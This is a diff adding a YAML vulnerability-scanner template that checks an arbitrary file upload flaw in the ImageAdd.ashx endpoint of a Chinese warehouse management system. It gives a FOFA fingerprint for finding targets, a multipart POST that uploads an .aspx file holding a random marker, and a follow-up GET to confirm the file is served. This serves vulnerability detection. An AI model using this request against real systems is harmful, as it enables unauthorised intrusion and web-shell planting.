@@ -1,0 +1,34 @@
+id: poc-yaml-zzskzy-wms-imageadd-ashx-anyfile-upload
+info:
+  name: 郑州时空 仓储精细化管理系统 ImageAdd.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 仓储精细化管理系统
+  fofa: body="SKControlKLForJson.ashx"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+  dt1: datetime("2006")
+  dt2: datetime("01")
+  dt3: datetime("02")
+requests:
+- method: POST
+  path: /ImageUpload/ImageAdd.ashx
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+  data: '------WebKitFormBoundaryssh7UfnPpGU7BXfK
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--'
+  expression: status_code == 200 && contains(body,".aspx") && !contains(body,"<")
+- method: GET
+  path: /upload/{{.dt1}}{{.dt2}}{{.dt3}}/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
